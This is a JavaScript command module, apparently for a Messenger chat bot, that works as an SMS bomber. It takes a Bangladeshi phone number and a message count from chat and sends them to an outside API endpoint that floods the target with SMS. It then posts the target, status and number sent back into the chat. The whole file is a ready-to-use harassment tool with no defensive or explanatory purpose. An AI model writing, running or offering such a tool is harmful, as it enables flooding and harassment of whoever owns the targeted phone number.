const axios = require("axios");

module.exports = {
  config: {
    name: "smsbomber",
    aliases: ["smsbomb", "bomb"],
    version: "2.0",
    author: "𝐒𝐈𝐀𝐌 𝐀𝐇𝐌𝐄𝐃 𝐒𝐀𝐀𝐍",
    countDown: 5,
    role: 0,
    shortDescription: "BD SMS Bomber",
    category: "tools",
    guide: "{pn} [phone] [count]"
  },

  onStart: async function ({ api, event, args }) {
    const { threadID, messageID } = event;
    const API_URL = "https://xalman-apis.vercel.app/api/bomb";

    const phone = args[0];
    const count = args[1] || 1;

    if (!phone || isNaN(phone) || phone.length < 11) {
      return api.sendMessage("╭─❍\n│ Usage: {pn} 01XXXXXXXXX [count]\n╰───────────⟡", threadID, messageID);
    }

    api.setMessageReaction("🚀", messageID, () => {}, true);

    try {
      const res = await axios.get(`${API_URL}?phone=${phone}&count=${count}`);

      if (res.data.status === true) {
        api.setMessageReaction("✅", messageID, () => {}, true);
        return api.sendMessage(
          `❖ 𝗦𝗠𝗦 𝗕𝗢𝗠𝗕𝗘𝗥 𝗕𝗗 ❖\n━━━━━━━━━━━━━━━━━━\n` +
          `📱 Target: ${res.data.target}\n` +
          `💬 Status: ${res.data.message}\n` +
          `📊 Sent: ${res.data.sent_amount}\n` +
          `━━━━━━━━━━━━━━━━━━`,
          threadID, messageID
        );
      } else {
        throw new Error();
      }

    } catch (error) {
      api.setMessageReaction("❌", messageID, () => {}, true);
      return api.sendMessage("✕ Bombing failed or API error!", threadID, messageID);
    }
  }
};
